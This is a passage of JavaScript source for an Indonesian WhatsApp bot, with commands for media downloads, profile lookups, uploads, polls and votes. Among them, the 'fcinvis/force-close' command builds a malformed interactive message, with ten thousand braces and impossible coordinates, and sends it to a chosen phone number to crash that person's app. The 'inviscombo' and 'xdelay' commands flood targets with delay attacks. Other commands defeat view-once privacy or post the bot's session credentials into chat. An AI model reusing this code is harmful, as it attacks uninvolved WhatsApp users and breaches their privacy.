4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replyReinzID(cap)
}
break
break
case 'sc':
case 'script':
case 'donasi': {
const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: RyuuBotz.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> KLIK TOMBOL DIBAWAH UNTUK MENUJU KE WEBSITE OWNER` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"WEBSITE OWNER )","url":"https://youtu.be/dz1MhkbPthI","merchant_url":"https://youtu.be/dz1MhkbPthI"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'getsession':
if (!isRyuuTheCreator) return reply(mess.only.owner)
replyReinzID('Tunggu sebentar, saat ini sedang mengambil file sesi Anda')
let sesi = await fs.readFileSync('./node_modules/Arisu-MD/sessions/creds.json')
RyuuBotz.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break                           
 case 'fcinvis':
case 'force-close': {
  if (!isRyuuTheCreator) return reply(mess.only.owner)
  if (!text) return reply(`Masukkan nomor target!\nContoh:\n${prefix + command} 628xxxxxx`)
  
  let nomor = text.replace(/[^0-9]/g, '') // bersihkan karakter aneh
  if (nomor.length < 8) return reply('❌ Nomor tidak valid.')

  let target = nomor + '@s.whatsapp.net'

  await RyuuBotz.sendMessage(m.chat, { react: { text: "💣", key: m.key } })

  async function AcelsLoc(target) {
    try {
      let message = {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "𝘼𝙘𝙚𝙡𝙨𝘽𝙪𝙜",
                hasMediaAttachment: false,
                locationMessage: {
                  degreesLatitude: -6666666666,
                  degreesLongitude: 6666666666,
                  name: "",
                  address: ""
                }
              },
              body: {
                text: "☇𝘼𝙘𝙚𝙡𝙨𝘽𝙪𝙜"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
              },
              contextInfo: {
                participant: target,
                mentionedJid: [target]
              }
            }
          }
        }
      }

      await RyuuBotz.relayMessage(target, message, {
        messageId: null,
        participant: { jid: target },
        userJid: target
      })

      reply(`✅ Bug berhasil dikirim ke ${nomor}`)
    } catch (err) {
      console.log("Error AcelsLoc:", err)
      reply("❌ Gagal mengirim bug.")
    }
  }

  AcelsLoc(target)
}
break 
case 'inviscombo': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
    if (!args[0]) return reply("⚠️ Format salah!\nContoh: .inviscombo 628xxxx");
  const dur = parseInt(text.split(" ")[1]) || 60; // default 60 menit
  const target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  replyryuu(`🚀 InvisiCombo FULL aktif selama *${dur} menit* ke @${target.split("@")[0]}`);
  await inviscombo(RyuuBotz, target, dur);
}
break;
 case 'xdelay':
    if (!isRyuuTheCreator) return reply(mess.only.owner);
    if (!args[0]) return reply("⚠️ Format salah!\nContoh: .xdelay 628xxxx");
    let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await VampSuperDelay(RyuuBotz, target);
    reply("✅ Delay berhasil dikirim.");
    break;        
case 'q': case 'quoted': {
if (!m.quoted) return replyReinzID('Reply the Message!!')
let xeonquotx= await RyuuBotz.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replyReinzID('Pesan yang Anda reply tidak dikirim oleh bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk': {
  const { igstalk } = require('./command/ig-stalker');
  if (!args[0]) return reply(`Contoh: ${prefix + command} mahirushiina`);

  try {
    const result = await igstalk(args[0]);

    const caption = `
👤 Username: ${result.username}
📛 Nama: ${result.fullname}
📸 Postingan: ${result.post}
👥 Followers: ${result.followers}
✅ Verified: ${result.verified ? "Ya" : "Tidak"}
🧾 Bio: ${result.bio}
📊 Engagement: ${result.engagement}
    `.trim();

    await RyuuBotz.sendMessage(m.chat, {
      image: { url: result.profile },
      caption
    }, { quoted: m });
  } catch (err) {
    reply(err);
  }
}
break;
case 'ffstalk': {
  await stalker.ffstalk({ q, replyReinzID, prefix, command, text, mess });
}
break;
case 'mlstalk': {
  await stalker.mlstalk({ text, reply, prefix, command });
}
break;
case 'npmstalk': {
  await stalker.npmstalk({ q, replyReinzID, prefix, command, mess });
}
break;
//=========================================\\
case 'twitterdl':
case 'twitter': {
  function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Linknya mana, bro..');
try {
  RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
let { SD, HD, desc, thumb, audio } = await fg.twitter(text)
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
RyuuBotz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  console.error(e);
  reply('Server error!');
  return e.toString();
}
}
break
//=============================================================
case 'mediafire5': {
const mediafire5 = require('./command/mediafire');
  mediafire5({ text, m, prefix, command, RyuuBotz, reply });
}
break;
//===================
case 'webtoon':
case 'webtoons': {
const fetch = require("node-fetch")
if (!text) return reply(`${prefix + command} how to kontol`)
reply('wait proses 🗿')
await fetch(`https://api.diioffc.web.id/api/search/webtoons?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian WEBTOONS*\n\n'
for (let i of response.result) {
teks += `*◦ Judul :* ${i.judul}\n`
teks += `*◦ Genre :* ${i.genre}\n`
teks += `*◦ Author :* ${i.author}\n`
teks += `*◦ Likes :* ${i.likes}\n`
teks += `*◦ Link Url :* ${i.link}\n\n`
}
reply(teks)
}).catch(err => reply('Error 🗿'))
}
break
//===============
case 'igdl': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
if (!text) return replyReinzID(`Contoh: ${prefix + command} link`);
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  
  try {
    let media = await (await fetch(`https://endpoint.web.id/downloader/instagram?key=${global.key}&url=${text}`)).json();
    let data = media.result;
    
    if (data.videoUrl) {
      await RyuuBotz.sendMessage(m.chat, { 
        video: { url: data.videoUrl }, 
        caption: 'success kak',
        mimetype: 'video/mp4' 
      }, { quoted: m });
    } else if (data.imageUrl) {
      await RyuuBotz.sendMessage(m.chat, { 
        image: { url: data.imageUrl }, 
        caption: 'success kak',
        mimetype: 'image/jpeg' 
      }, { quoted: m });
    } else {
      reply('Media tidak ditemukan!');
    }
  } catch (e) {
    reply(e.message);
    console.log(e);
  }
}
break
case 'snackvideo': {
  if (!text) return reply(mess.query.link)
  reply(mess.query.link)
const data = fetchJson(`https://api.alyachan.dev/api/snackvideo?url=${encodeURIComponent(text)}&apikey=DinzIDgembul`)
const vidnya = data.data.url;
const cption = "nih kak"
RyuuBotz.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replyReinzID(`Contoh ${prefix+command} DGXeon`)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
aj = await githubstalk.githubstalk(`${q}`)
RyuuBotz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
//=================================================
case 'sewa':
case 'sewabot':{
sun = `┏━─━─━─━─━─━─━─━─━─━┓  
 ✨ *sᴇᴡᴀ ʙᴏᴛ ${botname}* ✨  
┗━─━─━─━─━─━─━─━─━─━┛  

*ʜᴀʟᴏ ᴋᴀᴋ ${pushname} ${ReinzIDliatwaktu}!*
ᴍᴀᴜ sᴇᴡᴀ ᴊᴀᴅɪ ʙᴏᴛ? ʏᴜᴋ, ᴘɪʟɪʜ ᴘᴀᴋᴇᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ! 

━━━━━━━━━━━━━━━  
✨ *ᴘᴀᴋᴇᴛ ᴛʀɪᴀʟ* ✨  
━━━━━━━━━━━━━━━  
📋 *ɪɴғᴏ ᴘᴇᴍʙᴇʟɪᴀɴ*:  
└─ ɴᴀᴍᴀ: ${pushname}  
└─ ᴘᴀᴋᴇᴛ: ᴛʀɪᴀʟ  
📌 *ʜᴀʀɢᴀ ᴘᴀᴋᴇᴛ ᴛʀɪᴀʟ*:   
└─ 10ᴋ = 1 ʙᴜʟᴀɴ
 *ᴋᴇᴜɴᴛᴜɴɢᴀɴ*:  
ᴊᴀɢᴀ ɢʀᴏᴜᴘ
ɢᴀᴍᴇ sᴇʀᴜ  
ᴀɴᴛɪʟɪɴᴋ ɢᴄ ʟᴀɪɴ   
ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ  
ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ  
ᴀᴅᴍɪɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ  
ᴡᴇʟᴄᴏᴍᴇ ᴋᴇᴄᴇ  
ʟɪᴍɪᴛ ᴜɴʟɪᴍɪᴛᴇᴅ  
ᴜɴʟᴏᴄᴋ sᴇᴍᴜᴀ ғɪᴛᴜʀ  
ᴅᴀᴘᴀᴛ ᴜᴘᴅᴀᴛᴇ ʟᴇʙɪʜ ᴄᴇᴘᴀᴛ  

━━━━━━━━━━━━━━━  
🏮 *ᴄᴀʀᴀ ᴘᴇᴍʙᴀʏᴀʀᴀɴ:*  
sɪʟᴀᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴏᴡɴᴇʀ ᴀᴛᴀᴜ ᴋᴇᴛɪᴋ ᴛᴇxᴛ ᴅɪ ʙᴀᴡᴀʜ.  

💶 *ᴘᴀʏᴍᴇɴᴛ💰*  
👥 *ᴏᴡɴᴇʀ*  
━━━━━━━━━━━━━━━  

⛩️ *ᴊᴀɴɢᴀɴ ʀᴀɢᴜ, ᴋᴀᴍɪ ᴊᴜɢᴀ ᴍᴇᴍɪʟɪᴋɪ ᴛᴇsᴛɪᴍᴏɴɪ !* `
RyuuBotz.sendMessage(m.chat, {
text: sun,
contextInfo: {
externalAdReply: {  
title: botname,
body: `${botname}`,
thumbnailUrl: '' + global.thumbnail,
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
        }
        break;
        case 'tourl': {
				if (!mime) return replyReinzID(`Kirim/Reply Video/Gambar Dengan Caption ${prefix + command}`);
				RyuuBotz.sendMessage(m.chat, { react: { text: "⏳️",key: m.key,}})
				try {
					let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted);
					if (/image|video|audio/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = `${pushname}`;
						let caption = `> ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\n> ᴘᴇɴɢᴜɴɢɢᴀʜ : ${uploader}`.trim();
						let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `*sᴜᴅᴀʜ sᴇʟᴇsᴀɪ ${pushname} sɪʟᴀʜᴋᴀɴ ᴅɪᴄᴏᴘᴘʏ ʟɪɴᴋɴʏᴀ*`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: {url:'./node_modules/Arisu-MD/data/image/mahiru-cute.jpg'} }, { upload: RyuuBotz.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Click to get link\",\"id\":\"123456789\",\"copy_code\":\"${response}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: m}
  );

  await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						Reply(response);
					} else {
						replyReinzID(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					replyReinzID("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			break
//=================={{=[===================]]\\
case 'tourl2': {
  if (!quoted) return reply(`Reply gambar yang ingin di-upload!`)
  if (!/image/.test(mime)) return reply(`Itu bukan gambar!`)
  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳️",key: m.key,}})
  const axios = require("axios")
  const fs = require("fs")
  const FormData = require("form-data")
  const path = require("path")

  try {
    let mediaPath = await RyuuBotz.downloadAndSaveMediaMessage(quoted)

    const form = new FormData()
    form.append('file', fs.createReadStream(mediaPath))

    const res = await axios.post(
      'https://api.aceimg.com/api/upload',
      form,
      {
        headers: {
          ...form.getHeaders()
        }
      }
    )

    fs.unlinkSync(mediaPath)

    const data = res.data
    if (data.status && data.link) {
      // Ambil filename dari link
      const match = data.link.match(/f=([^\s]+)/)
      const filename = match ? match[1] : null

      if (filename) {
        const cdnLink = `https://cdn.aceimg.com/${filename}`
        reply(`✅ Berhasil upload!\n🌐 Link: ${cdnLink}`)
      } else {
        reply(`✅ Berhasil upload, tapi gagal ambil filename!\n🌐 Link: ${data.link}`)
      }

    } else {
      reply(`❌ Upload gagal!\n📄 ${data.message || 'Tidak diketahui'}`)
    }

  } catch (err) {
    console.error(err)
    reply(`❌ Upload error: ${err.response?.data?.message || err.message}`)
  }
}
break
case 'tourl3': {
  if (!m.quoted || !m.quoted.mimetype) {
    return replyryuu(`Reply file (gambar, dokumen, audio, video) dengan command *${prefix + command}*`);
  }

  try {
  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳️",key: m.key,}})
    let media = await RyuuBotz.downloadMediaMessage(m.quoted);
    let filePath = './node_modules/Arisu-MD/tempUpload_' + Date.now();

    // Simpan buffer ke file sementara
    const fs = require('fs');
    fs.writeFileSync(filePath, media);

    const uploadFile = require('cloudku-uploader');
    const result = await uploadFile(filePath);

    // Hapus file temp
    fs.unlinkSync(filePath);

    if (result && result.data && result.data.url) {
    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
      replyryuu(`✅ *Berhasil Upload!*\n🌐 URL: ${result.data.url}`);
    } else {
    await RyuuBotz.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
      replyryuu(`⚠️ Upload berhasil, tapi server tidak kirim URL.\nℹ️ Response: ${JSON.stringify(result)}`);
    }

  } catch (e) {
    console.error(e);
    await RyuuBotz.sendMessage(m.chat, { react: { text: "❌",key: m.key,}})
    replyryuu('⚠️ Error saat upload file: ' + e.message);
  }
}
break;
//=================================================================
case 'carimusik': {
if (!quoted) return replyReinzID(`mana Musiknya kak?`)
const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=efcb180d3fd3134748648887&file=${anuu.url}`);
	reply(`Status: succes\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}
break
//=================================================================
case 'ocr': {
  if (!quoted) return replyReinzID(`mana fotonya kak?`)
  RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const data = await fetchJson(`https://api.alyachan.dev/api/ocr?image=${anuu.url}&apikey=ReinzIDgembul`)
	const textnya = data.data.text
	reply(`${textnya}`)
}
break
case 'tozombie':
case 'jadizombie': {
  if (!quoted) return replyReinzID(`mana fotonya kak?`)
  reply(mess.wait)
  const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const data = await fetchJson(`https://widipe.com/tools/jadizombie?url=${anuu.url}`)
	const zombie = data.result
	RyuuBotz.sendMessage(m.chat, { image: { url: zombie }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
}
break
case "1x-liat":
case "rvo-ft":
case "getimg":
case "getft": {
  if (!isPrem) {
    return replyprem(mess.premium); // Khusus premium
  }

  if (!m.quoted || typeof m.quoted.download !== "function") {
    return reply(`Reply gambar 1x liat yang ingin di ambil dengan perintah *${prefix + command}*`);
  }

  const mime = m.quoted.mimetype || "";
  if (!/image\/(jpe?g|png)/.test(mime)) {
    return reply(`Media yang direply bukan gambar. Hanya mendukung jpg/jpeg/png`);
  }

  reply("Mengambil gambar...");
  try {
    const imgBuffer = await m.quoted.download();

    await RyuuBotz.sendMessage(m.chat, {
      image: imgBuffer,
      caption: "*Berhasil mengambil gambar!*"
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    reply(`Gagal mengirim ulang gambar: ${err.message}`);
  }
}
break;
      case 'rvo-vid':
      case 'getmp4':
      case 'getvideo': 
      case 'getvid': {
  if (!m.quoted || m.quoted.mtype !== 'videoMessage') return reply('Reply ke video yang ingin diambil');

  try {
    const vid = await RyuuBotz.downloadAndSaveMediaMessage(m.quoted);
    await RyuuBotz.sendMessage(m.chat, {
      video: { url: vid },
      caption: 'Nih videonya kak~'
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    reply('Gagal mengambil ulang video.');
  }
}
break;
case 'join': {
    if (!isRyuuTheCreator) return reply(mess.only.owner)
    if (!text) return replyReinzID(`Contoh ${prefix + command} linkgc`)
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyReinzID('Link Invalid!')
    let result = args[0].split('https://chat.whatsapp.com/')[1]
    try {
        await RyuuBotz.groupAcceptInvite(result)
        await replyReinzID(`Sukses join group kak`)
    } catch (e) {
        console.log(`Error join group:`, e)
        await replyReinzID(`Gagal join group: ${e?.message || 'Terjadi kesalahan'}`)
    }
}
break
case 'poll': {
	if (!isRyuuTheCreator) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replyReinzID(
`Sebutkan pertanyaan dan minimal 2 pilihan\nContoh: ${prefix}poll Siapa admin terbaik?|Reinz,Asep,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await RyuuBotz.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replyReinzID(`_Masih ada suara di chat ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
            if (!text) return replyReinzID(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
            replyReinzID(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa suara\n*${prefix} deletevote* - untuk menghapus suara`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            RyuuBotz.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyReinzID(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyReinzID('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            RyuuBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyReinzID(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyReinzID('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            RyuuBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replyReinzID(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${RyuuBotz.user.id}
`
RyuuBotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replyReinzID(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replyReinzID('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replyReinzID(`Reply Image/Video`)
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (/image/.test(mime)) {
anuan = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
RyuuBotz.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
RyuuBotz.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replyReinzID(`Contoh:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyReinzID(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'waifu':
case 'yandere': {
if (!isPrem) return replyprem(mess.premium)
await RyuuBotz.sendMessage(m.chat, { react: { text: "🤨",key: m.key,}})
  try {
    const baseUrl = 'https://api.nekorinn.my.id/random/yandere';
    const response = await fetch(baseUrl);
    const arrayBuffer = await response.arrayBuffer(); // pastikan dalam bentuk arrayBuffer
    const imageBuffer = Buffer.from(arrayBuffer); // konversi ke Buffer
    await RyuuBotz.sendMessage(m.chat, {
      image: imageBuffer,
      caption: `Random ${command} for you!✨`
    }, { quoted: m });
  } catch (e) {
    console.error(e);
    replyryuu('Maaf, terjadi kesalahan saat mengambil gambar.');
  }
}
break;
 case 'alkitab':{ 
     if (!text) return reply( `uhm.. teksnya mana?\n\ncontoh:\n${prefix + command} kejadian`)
     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
  
     let $ = cheerio.load(res.data) 
     let result = [] 
     $('div.vw').each(function (a, b) { 
         let teks = $(b).find('p').text().trim() 
         let link = $(b).find('a').attr('href') 
         let title = $(b).find('a').text().trim() 
         result.push({ teks, link, title }) 
     }) 
 
   let foto = 'https://telegra.ph/file/a333442553b1bc336cc55.jpg'
   let judul = '*────────「 Alkitab 」 ────────*'
     let caption = result.map(v => `💌 ${v.title}\n📮 ${v.teks}`).join('\n┄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┄\n') 
      RyuuBotz.sendFile(m.chat, foto, 'alkitab.jpg', `${judul}\n\n${caption}`, m)
 } 
break
            case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 RyuuBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await RyuuBotz.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 RyuuBotz.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'gc-official':
case 'gcbot':
case 'botgc':
case 'officialgc': {
   try {
      if (!global.wagc || typeof global.wagc !== 'string')
         return await RyuuBotz.sendMessage(m.chat, { text: 'Maaf, link grup belum disetel di *global.wagc*.' }, { quoted: m })

      let teks = `*🌟 Official Group Bot 🌟*\n\nJoin grup resmi untuk update, diskusi, atau bantuan:\n\n📌 ${global.wagc}\n\nJangan lupa patuhi peraturan ya~ 💖`

      await RyuuBotz.sendMessage(m.chat, { text: teks }, { quoted: m })
   } catch (err) {
      console.error(err)
      await RyuuBotz.sendMessage(m.chat, { text: 'Maaf, terjadi kesalahan saat menampilkan link grup.' }, { quoted: m })
   }
}
break;
      case 'info':
        case 'tes':
        case 'ping':
        case 'bot':
        case 'bot-tes':
        case 'bottes': {
        RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try {
  
  const { execSync } = require('child_process');
  const output = execSync('df -h /').toString().split('\n')[1].split(/\s+/);

  const totals = output[1];
  const useds = output[2];
  const availables = output[3];
  const percents = output[4];
  
  const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
